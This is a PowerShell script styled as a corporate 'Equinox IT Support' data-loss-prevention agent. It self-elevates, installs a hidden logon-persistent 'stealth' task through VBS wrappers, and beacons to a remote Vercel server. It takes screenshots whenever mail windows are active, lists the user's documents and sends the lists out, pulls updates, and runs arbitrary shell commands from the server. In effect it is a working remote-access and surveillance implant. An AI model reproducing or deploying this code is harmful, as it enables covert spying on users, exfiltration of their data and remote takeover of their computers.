param(
    [string]$ServerUrl = "https://unified-manager-q8xuknqq-wiandu-randts-projects.vercel.app",
    [switch]$Install
)

# Version: 1.7.5
# Description: Extreme-Compat User-Mode Agent with stable ID detection.

# 0. SELF-ELEVATION (Needed for Security Logs)
$IsAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $IsAdmin) {
    try {
        # Only attempt if we're not already in a recursive loop
        if ($env:UEA_ELEVATED -ne "TRUE") {
            $env:UEA_ELEVATED = "TRUE"
            Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -ErrorAction Stop
            exit
        }
    } catch {
        # If elevation fails (user clicks No), continue in limited mode
    }
}

# 1. ENVIRONMENT SANITATION
[Net.ServicePointManager]::SecurityProtocol = "Tls, Tls11, Tls12"
$ProgressPreference = 'SilentlyContinue'
$ErrorActionPreference = "Stop"
$InstallDir = "$env:LOCALAPPDATA\UnifiedAgent"
$LogFile = "$InstallDir\agent.log"
$ScriptPath = "$InstallDir\unified-agent.ps1"
$ConfigPath = "$InstallDir\config.json"
$SupportLogo = "Equinox-Logo-Transparent.png"

function Log-Message {
    param($Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $Line = "[$Timestamp] $Message"
    if ($LogFile) {
        try {
            if (-not (Test-Path (Split-Path $LogFile))) { New-Item -ItemType Directory -Path (Split-Path $LogFile) -Force | Out-Null }
            $Line | Out-File -FilePath $LogFile -Append -Encoding utf8
        } catch {}
    }
}

function Send-DlpEvent {
    param($Type, $Details, $Severity)
    try {
        $Payload = @{
            agentId = $AgentId
            type = $Type
            details = $Details
            severity = $Severity
            timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssZ"
        }
        $BodyJson = $Payload | ConvertTo-Json
        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/dlp" -Body $BodyJson -ContentType "application/json" | Out-Null
        Log-Message "DLP Event Reported: $Type ($Severity)"
    } catch { Log-Message "DLP Report Fail: $($_.Exception.Message)" }
}

# 2. GHOST KILLER (User-Mode)
try {
    Get-CimInstance Win32_Process | Where-Object { $_.CommandLine -like "*unified-agent.ps1*" -and $_.ProcessId -ne $PID } | ForEach-Object { 
        Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue 
    }
} catch {}

# 3. ROBUST INSTALLATION LOGIC
function Install-StealthAgent {
    try {
        Log-Message "Initiating User-Level Persistent Install v1.7.5..."
        $TaskName = "UEA_Support_Persistence"
        Get-ScheduledTask -TaskName $TaskName -ErrorAction SilentlyContinue | Stop-ScheduledTask -ErrorAction SilentlyContinue
        Unregister-ScheduledTask -TaskName $TaskName -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
        
        if (-not (Test-Path $InstallDir)) { New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null }
        
        Log-Message "Deploying binary..."
        $SourceFile = if ($PSCommandPath -and $PSCommandPath -ne $ScriptPath) { $PSCommandPath } else { "$InstallDir\temp_agent.ps1" }
        
        if ($SourceFile -match "temp_agent.ps1") {
            (New-Object System.Net.WebClient).DownloadFile("$ServerUrl/api/agent/update", "$SourceFile")
        }

        Copy-Item -Path $SourceFile -Destination $ScriptPath -Force -ErrorAction Stop
        
        $Config = @{ ServerUrl = $ServerUrl; Version = "1.7.5" }
        $Config | ConvertTo-Json | Out-File -FilePath $ConfigPath -Force
        
        $VbsMainPath = "$InstallDir\uea_stealth.vbs"
        $VbsMainCode = "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False"
        $VbsMainCode | Out-File -FilePath $VbsMainPath -Force -Encoding ascii

        $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsMainPath`""
        $Trigger = New-ScheduledTaskTrigger -AtLogOn
        $Settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
        
        Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Settings $Settings | Out-Null
        
        Start-ScheduledTask -TaskName $TaskName | Out-Null
        Log-Message "User-Mode v1.7.0 Active."
        if ($Host.Name -match "ConsoleHost" -or -not $PSCommandPath) {
            exit
        }
    } catch { Log-Message "Install Fail: $($_.Exception.Message)" }
}

# 4. MAIN LOOP
try {
    if ($Install) {
        Install-StealthAgent
    }

    # Use BIOS UUID first for consistency with Intune/Legacy records
    $AgentId = try { (Get-CimInstance Win32_ComputerSystemProduct -ErrorAction Stop).UUID } catch { 
        try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Cryptography' -ErrorAction Stop).MachineGuid } catch { "$($env:COMPUTERNAME)" }
    }
    $SerialNumber = try { (Get-ItemProperty -Path 'HKLM:\HARDWARE\DESCRIPTION\System\BIOS' -ErrorAction Stop).SystemSerialNumber } catch { "Unknown" }
    
    $TaskName = "UEA_Support_Persistence"
    $TaskStatus = try { Get-ScheduledTask -TaskName $TaskName -ErrorAction Stop } catch { $null }
    
    if (($PSCommandPath -ne $ScriptPath) -or ($null -eq $TaskStatus)) {
        Install-StealthAgent
    }

    if (Test-Path $ConfigPath) {
        $SavedConfig = try { Get-Content $ConfigPath | ConvertFrom-Json } catch { $null }
        if ($SavedConfig) { $ServerUrl = $SavedConfig.ServerUrl }
    }

    Log-Message "Agent v1.7.5 Started (Admin=$IsAdmin). ID: $AgentId"
    
    # Define Win32 API for foreground window
    $Win32Code = @'
    using System;
    using System.Runtime.InteropServices;
    public class Win32 {
        [DllImport("user32.dll")]
        public static extern IntPtr GetForegroundWindow();
    }
'@
    if (-not ("Win32" -as [type])) {
        Add-Type -TypeDefinition $Win32Code
    }
    
    function Take-Screenshot {
        try {
            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
            $Screen = [System.Windows.Forms.Screen]::PrimaryScreen
            $Bitmap = New-Object System.Drawing.Bitmap($Screen.Bounds.Width, $Screen.Bounds.Height)
            $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap)
            $Graphics.CopyFromScreen($Screen.Bounds.X, $Screen.Bounds.Y, 0, 0, $Bitmap.Size)
            $MS = New-Object System.IO.MemoryStream
            $Bitmap.Save($MS, [System.Drawing.Imaging.ImageFormat]::Jpeg)
            $Base64 = [Convert]::ToBase64String($MS.ToArray())
            $Graphics.Dispose(); $Bitmap.Dispose(); $MS.Dispose()
            return $Base64
        } catch { return $null }
    }

    function Start-DataScan {
        Log-Message "Starting Data Discovery Scan..."
        $Paths = "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads"
        $Extensions = "*.pdf", "*.docx", "*.xlsx", "*.csv", "*.txt"
        $Found = @()
        foreach ($Path in $Paths) {
            if (Test-Path $Path) {
                Get-ChildItem -Path $Path -Include $Extensions -Recurse -File -ErrorAction SilentlyContinue | ForEach-Object {
                    $Found += $_.FullName
                }
            }
        }
        return $Found
    }
    
    # 5. DLP MONITORING STATE
    $KnownDrives = @()
    $FileWatchers = @{}

    $LastIpCheck = 0
    $CachedPubIp = "Unknown"
    $CachedLocIp = "Unknown"
    
    $LastBlockCheck = Get-Date
    $LastSnapshotTime = 0

    function Check-BlockedEvents {
        try {
            # 1. Check Windows Defender / ASR Rule blocks (Event ID 1121)
            $DefenderEvents = Get-WinEvent -FilterHashtable @{
                LogName = 'Microsoft-Windows-Windows Defender/Operational'
                Id = 1121
                StartTime = $script:LastBlockCheck
            } -ErrorAction SilentlyContinue

            foreach ($Event in $DefenderEvents) {
                if ($Event.Message -match "Removable" -or $Event.Message -match "USB") {
                    Send-DlpEvent -Type "usb_blocked_attempt" -Details "Defender ASR: Blocked attempted write to USB. Event ID 1121." -Severity "critical"
                }
            }

            # 2. Check Security Log for Access Denied (Event ID 4656/4663)
            # This handles GPO 'Deny Write Access' blocks if auditing is enabled
            $SecurityEvents = Get-WinEvent -FilterHashtable @{
                LogName = 'Security'
                Id = 4656, 4663
                StartTime = $script:LastBlockCheck
            } -ErrorAction SilentlyContinue

            foreach ($Event in $SecurityEvents) {
                if ($Event.Message -match "Removable" -and ($Event.Message -match "Access: Denied" -or $Event.Message -match "Result: Failure")) {
                    Send-DlpEvent -Type "usb_blocked_attempt" -Details "OS Blocked: Attempted write to Removable Storage. Event ID $($Event.Id)." -Severity "critical"
                }
            }

            $script:LastBlockCheck = (Get-Date).AddSeconds(-1) # Overlap by 1s to ensure no misses
        } catch { Log-Message "BlockCheck Warn: $($_.Exception.Message)" }
    }

    while ($true) {
        try {
            $OSInfo = try { (Get-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -ErrorAction Stop).ProductName } catch { "Windows Endpoint" }
            
            # --- IP CACHING (Check every 10 mins or if UNKNOWN) ---
            $Now = [DateTimeOffset]::Now.ToUnixTimeSeconds()
            if (($Now - $LastIpCheck -gt 600) -or ($CachedPubIp -eq "Unknown")) {
                $CachedPubIp = try { (Invoke-RestMethod -Uri "https://api.ipify.org?format=json" -TimeoutSec 5).ip } catch { "Unknown" }
                $CachedLocIp = try { (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.InterfaceAlias -notlike "*Loopback*" } | Select-Object -First 1).IPAddress } catch { "Unknown" }
                $LastIpCheck = $Now
            }
            
            $Payload = @{
                agentId = $AgentId; serialNumber = $SerialNumber; version = "1.7.5"; status = "online"
                deviceName = $env:COMPUTERNAME; os = $OSInfo; publicIp = $CachedPubIp; localIp = $CachedLocIp; isp = "Enterprise"
            }
            $BodyJson = $Payload | ConvertTo-Json
            $Response = try { 
                Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/heartbeat" -Body $BodyJson -ContentType "application/json" -TimeoutSec 10 
            } catch { 
                Log-Message "Heartbeat Missed (Retrying): $($_.Exception.Message)"
                # No throw here - allows retry in next loop
            }

            # --- DLP MONITORING ---
            $CurrentDrives = Get-CimInstance Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 } # 2 = Removable
            foreach ($Drive in $CurrentDrives) {
                if ($Drive.DeviceID -notin $KnownDrives) {
                    $KnownDrives += $Drive.DeviceID
                    Send-DlpEvent -Type "usb_inserted" -Details "USB Drive Detected: $($Drive.DeviceID) ($($Drive.VolumeName))" -Severity "medium"
                    
                    # Setup FileWatcher for the new drive
                    $DrivePath = "$($Drive.DeviceID)\"
                    try {
                        $Watcher = New-Object System.IO.FileSystemWatcher
                        $Watcher.Path = $DrivePath
                        $Watcher.IncludeSubdirectories = $true
                        $Watcher.EnableRaisingEvents = $true
                        
                        $CreatedEvent = Register-ObjectEvent $Watcher "Created" -Action {
                            $FileName = $EventArgs.FullPath
                            $Drive = $EventArgs.Name.Split('\')[0]
                            $TargetFile = [System.IO.Path]::GetFileName($FileName)
                            Send-DlpEvent -Type "usb_copy" -Details "File copied to USB ($Drive): $TargetFile" -Severity "high"
                        }
                        $FileWatchers[$Drive.DeviceID] = @{ Watcher = $Watcher; Event = $CreatedEvent }
                    } catch { Log-Message "FSW Fail for $($Drive.DeviceID): $($_.Exception.Message)" }
                }
            }
            # Cleanup removed drives
            $RemovedDrives = $KnownDrives | Where-Object { $_ -notin $CurrentDrives.DeviceID }
            foreach ($DriveID in $RemovedDrives) {
                $KnownDrives = $KnownDrives | Where-Object { $_ -ne $DriveID }
                if ($FileWatchers.ContainsKey($DriveID)) {
                    $FileWatchers[$DriveID].Watcher.EnableRaisingEvents = $false
                    # Unregister-Event -SourceIdentifier $FileWatchers[$DriveID].Event.Name
                    $FileWatchers.Remove($DriveID)
                }
                Send-DlpEvent -Type "usb_removed" -Details "USB Drive Removed: $DriveID" -Severity "low"
            }
            # --- EMAIL & SNAPSHOT MONITORING ---
            $WinTitle = try { (Get-Process | Where-Object { $_.MainWindowHandle -ne 0 -and $_.Id -eq [Win32]::GetForegroundWindow() }).MainWindowTitle } catch { "" }
            if ($WinTitle -match "Gmail" -or $WinTitle -match "Outlook" -or $WinTitle -match "Mail") {
                $NowS = [DateTimeOffset]::Now.ToUnixTimeSeconds()
                if ($NowS - $LastSnapshotTime -gt 300) { # Every 5 mins max
                    $Snapshot = Take-Screenshot
                    if ($Snapshot) {
                        Send-DlpEvent -Type "security_snapshot" -Details "Snapshot evidence (window: $WinTitle)|data:image/jpeg;base64,$Snapshot" -Severity "critical"
                        $LastSnapshotTime = $NowS
                    }
                }
            }
            Check-BlockedEvents
            # ---------------------

            if ($Response.latestVersion -and ([version]$Response.latestVersion -gt [version]"1.7.5")) {
                Invoke-WebRequest -Uri "$ServerUrl/api/agent/update" -OutFile "$ScriptPath" -UseBasicParsing | Out-Null
                Install-StealthAgent
                $VbsRestart = "$InstallDir\restart.vbs"
                "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$ScriptPath`"`"`", 0, False" | Out-File -FilePath $VbsRestart -Force -Encoding ascii
                Start-Process "wscript.exe" -ArgumentList "`"$VbsRestart`""
                exit
            }

            foreach ($cmd in $Response.commands) {
                try {
                    $Result = ""
                    if ($cmd.type -eq "Message") {
                        $msgContent = $cmd.payload.message
                        $PopupScript = "$InstallDir\popup.ps1"
                        $MsgDataPath = "$InstallDir\msg.txt"
                        $msgContent | Out-File -FilePath $MsgDataPath -Force -Encoding utf8
                        
                        $PopupCode = @"
Add-Type -AssemblyName System.Windows.Forms, System.Drawing
[System.Windows.Forms.Application]::EnableVisualStyles()
`$Msg = Get-Content "$MsgDataPath" -Raw
`$Form = New-Object Windows.Forms.Form
`$Form.Text = 'Equinox IT Support'
`$Form.Size = New-Object Drawing.Size(550,380)
`$Form.StartPosition = 'CenterScreen'
`$Form.TopMost = `$true
`$Form.FormBorderStyle = 'FixedDialog'
`$Form.BackColor = [System.Drawing.Color]::White

`$IconBox = New-Object Windows.Forms.PictureBox
`$IconBox.Size = New-Object Drawing.Size(80, 80)
`$IconBox.Location = New-Object Drawing.Point(20, 30)
`$IconBox.SizeMode = 'Zoom'
try { 
    `$LogoUrl = "$ServerUrl/logo.png"
    `$Web = New-Object System.Net.WebClient
    `$ImgBytes = `$Web.DownloadData(`$LogoUrl)
    `$IconBox.Image = [System.Drawing.Image]::FromStream((New-Object IO.MemoryStream(`$ImgBytes, 0, `$ImgBytes.Length))) 
} catch { }

`$Header = New-Object Windows.Forms.Label
`$Header.Text = 'EQUINOX IT SUPPORT'
`$Header.ForeColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Header.Font = New-Object Drawing.Font('Segoe UI', 15, [System.Drawing.FontStyle]::Bold)
`$Header.Location = New-Object Drawing.Point(120, 30)
`$Header.Size = New-Object Drawing.Size(400, 35)

`$Disclaimer = New-Object Windows.Forms.Label
`$Disclaimer.Text = '*** OFFICIAL COMPANY COMMUNICATION ***'
`$Disclaimer.Font = New-Object Drawing.Font('Segoe UI', 9, [System.Drawing.FontStyle]::Bold)
`$Disclaimer.ForeColor = [System.Drawing.Color]::FromArgb(2, 132, 199)
`$Disclaimer.Location = New-Object Drawing.Point(120, 65)
`$Disclaimer.Size = New-Object Drawing.Size(400, 20)

# Use a TextBox for reliable scrolling and text wrapping
`$Content = New-Object Windows.Forms.TextBox
`$Content.Multiline = `$true
`$Content.ReadOnly = `$true
`$Content.BorderStyle = 'None'
`$Content.Text = `$Msg
`$Content.Font = New-Object Drawing.Font('Segoe UI', 11)
`$Content.Location = New-Object Drawing.Point(120, 100)
`$Content.Size = New-Object Drawing.Size(400, 150)
`$Content.BackColor = [System.Drawing.Color]::White
`$Content.ScrollBars = 'Vertical'

`$Legal = New-Object Windows.Forms.Label
`$Legal.Text = 'This message is intended solely for the addressee and may contain confidential information.'
`$Legal.Font = New-Object Drawing.Font('Segoe UI', 8, [System.Drawing.FontStyle]::Italic)
`$Legal.ForeColor = [System.Drawing.Color]::Gray
`$Legal.Location = New-Object Drawing.Point(20, 320)
`$Legal.Size = New-Object Drawing.Size(500, 20)

`$Button = New-Object Windows.Forms.Button
`$Button.Text = 'Acknowledge'
`$Button.Font = New-Object Drawing.Font('Segoe UI', 10, [System.Drawing.FontStyle]::Bold)
`$Button.Size = New-Object Drawing.Size(180, 45)
`$Button.Location = New-Object Drawing.Point(340, 260)
`$Button.BackColor = [System.Drawing.Color]::FromArgb(15, 23, 42)
`$Button.ForeColor = [System.Drawing.Color]::White
`$Button.FlatStyle = 'Flat'
`$Button.Add_Click({ `$Form.Close() })

`$Form.Controls.AddRange(@(`$IconBox, `$Header, `$Disclaimer, `$Content, `$Legal, `$Button))
`$Form.ShowDialog() | Out-Null
"@
                        $PopupCode | Out-File -FilePath $PopupScript -Force -Encoding utf8
                        $ActiveUser = (Get-CimInstance Win32_ComputerSystem).UserName
                        if ($ActiveUser) {
                            $VbsPopupPath = "$InstallDir\popup_stealth.vbs"
                            "CreateObject(`"WScript.Shell`").Run `"powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"`"$PopupScript`"`"`", 0, False" | Out-File -FilePath $VbsPopupPath -Force -Encoding ascii
                            $SupportTaskName = "UEA_Support_Msg_$(Get-Random)"
                            $Action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$VbsPopupPath`""
                            try {
                                $Principal = New-ScheduledTaskPrincipal -UserId $ActiveUser -LogonType Interactive
                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action -Principal $Principal | Out-Null
                            } catch {
                                Register-ScheduledTask -TaskName $SupportTaskName -Action $Action | Out-Null
                            }
                            Start-ScheduledTask -TaskName $SupportTaskName | Out-Null
                            Start-Sleep -Seconds 5
                            Unregister-ScheduledTask -TaskName $SupportTaskName -Confirm:$false | Out-Null
                        }
                    } elseif ($cmd.type -eq "SCAN_DEVICE") {
                        $Files = Start-DataScan
                        $Result = "Discovery Complete. Found $($Files.Count) sensitive files."
                        Send-DlpEvent -Type "discovery_result" -Details "Scan found files: $($Files -join ', ')" -Severity "info"
                    } elseif ($cmd.type -eq "shell") {
                        $Result = powershell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd.payload.command 2>&1 | Out-String
                    }
                    if ($Result) {
                        $ResultPayload = @{ agentId = $AgentId; commandId = $cmd.id; result = $Result }
                        Invoke-RestMethod -Method Post -Uri "$ServerUrl/api/agent/result" -Body ($ResultPayload | ConvertTo-Json) -ContentType "application/json" | Out-Null
                    }
                } catch { Log-Message "Cmd Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
            }
        } catch { Log-Message "Loop Fail at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
        Start-Sleep -Seconds 3
    }
} catch { Log-Message "Fatal at line $($_.InvocationInfo.ScriptLineNumber): $($_.Exception.Message)" }
